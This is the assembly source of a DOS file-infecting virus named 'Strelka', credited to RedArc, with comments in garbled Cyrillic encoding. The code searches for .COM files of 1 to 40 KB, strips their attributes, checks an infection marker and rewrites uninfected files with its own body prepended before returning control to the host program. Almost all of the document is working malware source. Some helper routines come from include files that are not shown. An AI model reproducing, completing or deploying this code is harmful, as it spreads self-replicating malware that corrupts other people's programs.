;Strelka
;(c) RedArc
Model Tiny
.code
.386
org 100h
start:
       db 0e9h
       db _aaa-3
       db 0
       db 90h
;---
_aaa equ $-start
VirusEntryPoint:
;����� ���� �� ࠧ��஢ ��ࠣ��
       mov bx,4000
       mov ah,4ah
       int 21h
;�뤥���� ���� ��� �����
       mov bx,4000
       mov ah,48h
       int 21h
       mov es,ax
       xchg dx,ax
;������� PSP � �뤥������ �����
       mov ah,26h
       int 21h
;�����㥬 ��������� ��ப�
       mov si,80h
       mov di,si
       mov cx,si
       rep movsb
;��७�ᨬ ����� �ࠧ� �� DTA
       push si
       add si,MyLength
       add si,1
       lodsw
       mov cx,ax
       pop si
       mov di,si
       add si,MyLength
       add si,3
       repe movsb
;���������� ᥣ����� ���� �����
       mov si,100h
       push es
       push si
;�뤥�塞 ���� ����� ��� �ନ஢���� ����� �����
       mov bx,4000
       mov ah,48h
       int 21h
;��ନ�㥬 ����� �����
       mov si,0
       mov di,BuffBegin
       mov bx,offset JumpsRestore
       push bx
@Manager@:
       jmp _Manager
;������� ���� ��� ���᪠
JumpsRestore:
       mov di,100h
       add di,MyLength
       add di,3
       push di
       mov ax,'.*'
       stosw
       mov ax,'?c'
       stosw
       mov ax,0006dh
       stosw
;�饬 ���� ���室�騩 䠩�
       pop dx
       pop es
       mov ah,4eh
       mov cx,0
Interrupt:
       int 21h
       jnb _@_0
       jmp FreeMem
_@_0:
       jmp TestFile
;�᢮������� ������
FreeMem:
       mov ah,49h
       int 21h
;������塞 ������� ॣ����� ��砫�묨 ���祭�ﬨ
       pop si
       pop es
       pop ax
       cmp ax,0
       je _@_1
       jmp AX_0
_@_1:
       jmp Int_Next
AX_0:
       mov ax,0
Int_Next:
       push ax
       mov dx,es
       mov ds,dx
;�����頥� �ࠢ����� ���⢥
       push es
       push si
       retf
;����஢���� 䠩��
TestFile:
       mov si,9ah
       lodsw
       cmp ax,1024
       jnb _@_2
       jmp _TF0
_@_2:
       jmp _TF1
_TF0:
       mov ax,4f00h
       jmp Interrupt
_TF1:
       cmp ax,1024*40
       jb _OpenFile
       jmp _TF0
_OpenFile:
       mov dx,9eh
       mov ax,4301h
       mov cx,0
       int 21h
       mov ax,3d02h
       mov dx,9eh
       int 21h
       xchg bx,ax
       mov ax,3f00h
       mov cx,0ffffh
       mov dx,100h
       add dx,MyLength
       add dx,3
       push dx
       int 21h
       pop di
       sub di,2
       push es
       push cs
       pop es
       stosw
       pop es
       add di,3
       xchg di,si
       lodsb
       cmp al,90h
       je _@_4
       jmp _SaveFile
_@_4:
       jmp _CloseFile
_CloseFile:
       mov ax,3e00h
       int 21h
       mov dx,9eh
       mov si,95h
       mov ax,0
       lodsb
       mov cx,ax
       mov ax,4301h
       int 21h
       jmp _TF0
_SaveFile:
       mov ax,4200h
       mov cx,0
       mov dx,0
       int 21h
       mov cx,bp
       push es
       pop ds
       mov dx,BuffBegin
       mov ah,40h
       int 21h
       push cs
       pop ds
       mov dx,100h
       add dx,MyLength
       mov si,dx
       add si,1
       lodsw
       mov cx,ax
       add cx,3
       mov ah,40h
       int 21h
       jmp _CloseFile
;---
_@@1:

;��� �⫠��� �� �㦭� ���������஢���
include manager.inc
include subrout.inc

;��� �⫠��� �� �㦭� �᪮�����஢���
;include debuger.inc

_VCG_Length equ $-_@@1
MyLength equ $-start
_@@2:
MxLength   dw MyxaLength
_@@3:
db 100h dup (90h)
       ret
MyxaLength equ $-_@@3
end start
